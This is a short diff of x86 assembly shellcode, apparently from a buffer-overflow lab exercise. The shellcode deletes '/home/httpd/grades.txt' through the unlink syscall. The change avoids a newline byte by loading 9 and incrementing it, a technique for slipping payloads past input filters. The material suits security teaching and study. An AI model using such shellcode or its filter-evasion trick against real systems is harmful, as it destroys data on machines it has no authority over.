@@ -2,6 +2,7 @@
 
 #define STRING	"/home/httpd/grades.txt"
 #define STRLEN	22
+#define SYS_unlink_dec 9
 
 .globl main
 	.type	main, @function
@@ -14,7 +15,8 @@
 	xorl	%eax,%eax		/* get a 32-bit zero value */
 	movb	%al,(STRLEN)(%esi)	/* null-terminate our string */
 
-	movb	$SYS_unlink,%al		/* syscall arg 1: syscall number */
+	movb	$SYS_unlink_dec,%al		/* syscall arg 1: syscall number */
+  inc %al
 	movl	%esi,%ebx		/* syscall arg 2: string pathname */
 	int	$0x80			/* invoke syscall */
 
